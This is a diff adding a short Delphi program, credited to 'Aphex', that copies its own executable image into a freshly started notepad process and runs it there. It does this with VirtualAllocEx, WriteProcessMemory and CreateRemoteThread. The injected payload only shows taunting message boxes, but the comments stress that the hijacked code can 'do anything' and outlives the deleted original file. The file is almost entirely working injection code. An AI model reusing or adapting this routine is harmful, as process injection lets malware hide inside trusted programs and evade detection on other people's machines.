@@ -1,0 +1,61 @@
+{
+  Process Hijacking by Aphex
+  http://www.iamaphex.cjb.net
+  unremote@knology.net
+
+  Greets to dildog for giving me the idea.
+}
+
+program Project1;
+
+{$IMAGEBASE $13140000}
+
+uses
+  Windows;
+
+function Main(dwEntryPoint: Pointer): longword; stdcall;
+begin
+  {now we are in notepad}
+  LoadLibrary('kernel32.dll');
+  LoadLibrary('user32.dll');
+  MessageBox(0, 'Hello, now I am in the memory of another process!', 'Hijacked Process', 0);
+  MessageBox(0, 'Now we can do anything we want. :)', 'Hijacked Process', 0);
+  MessageBox(0, 'You can even delete the original exe and these message boxes will still be here.', 'Hijacked Process', 0);
+  MessageBox(0, 'See?', 'Hijacked Process', 0);
+  MessageBox(0, 'Told you.', 'Hijacked Process', 0);
+  MessageBox(0, 'Ok, bye.', 'Hijacked Process', 0);
+  MessageBox(0, 'I''ll close notepad for you ;)', 'Hijacked Process', 0);
+  ExitProcess(0);
+  Result := 0;
+end;
+
+procedure Inject(ProcessHandle: longword; EntryPoint: pointer);
+var
+  Module, NewModule: Pointer;
+  Size, BytesWritten, TID: longword;
+begin
+  Module := Pointer(GetModuleHandle(nil));
+  Size := PImageOptionalHeader(Pointer(integer(Module) + PImageDosHeader(Module)._lfanew + SizeOf(dword) + SizeOf(TImageFileHeader))).SizeOfImage;
+  VirtualFreeEx(ProcessHandle, Module, 0, MEM_RELEASE);
+  NewModule := VirtualAllocEx(ProcessHandle, Module, Size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+  WriteProcessMemory(ProcessHandle, NewModule, Module, Size, BytesWritten);
+  CreateRemoteThread(ProcessHandle, nil, 0, EntryPoint, Module, 0, TID);
+end;
+
+var
+  ProcessHandle, PID: longword;
+  StartupInfo: TStartupInfo;
+  ProcessInfo: TProcessInformation;
+
+begin
+  {lets make a new process}
+  CreateProcess(nil, 'notepad', nil, nil, False, 0, nil, nil, StartupInfo, ProcessInfo);
+  {give it some time to wake up}
+  Sleep(500);
+  {and hijack it!}
+  GetWindowThreadProcessId(FindWindow('Notepad', nil), @PID);
+  ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
+  Inject(ProcessHandle, @Main);
+  CloseHandle(ProcessHandle);
+  {we have a copy of ourself running in notepad so we can exit}
+end.
